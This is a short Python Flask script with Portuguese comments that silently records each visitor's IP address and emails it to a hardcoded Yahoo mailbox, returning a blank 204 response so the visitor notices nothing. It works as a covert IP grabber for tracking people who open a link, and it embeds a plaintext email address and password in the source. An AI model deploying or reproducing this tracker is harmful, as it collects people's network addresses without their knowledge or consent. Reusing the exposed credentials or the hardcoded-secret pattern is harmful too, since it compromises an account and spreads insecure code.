from flask import Flask, request
import yagmail

app = Flask(__name__)

@app.route('/')
def index():
    ip = request.remote_addr

    # Configuração do servidor de email
    email_sender = 'minadoooo11@yahoo.com'
    email_password = 'prosopopei4'
    email_recipient = 'minadoooo11@yahoo.com'

    # Criação da mensagem
    subject = 'Endereço IP do Usuário'
    message = f'O endereço IP do usuário é: {ip}'

    # Envio do email
    try:
        yag = yagmail.SMTP(email_sender, email_password)
        yag.send(email_recipient, subject, message)
    except Exception as e:
        return f'Erro ao enviar o email: {str(e)}'

    return '', 204

if __name__ == '__main__':
    app.run()
